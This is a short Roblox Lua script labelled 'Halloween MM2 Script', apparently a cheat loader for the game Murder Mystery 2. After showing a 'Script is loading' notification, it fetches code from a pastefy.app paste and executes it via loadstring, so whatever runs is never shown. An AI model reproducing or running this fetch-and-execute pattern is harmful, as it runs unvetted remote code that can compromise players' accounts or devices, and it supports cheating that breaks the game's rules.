game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Halloween MM2 Script",
    Text = "Script is loading, please wait!",
    Button1 = "Ok",
    Duration = 5
})
task.wait(3)
loadstring(game:HttpGet("https://pastefy.app/5lG8ZZ5E/raw"))()
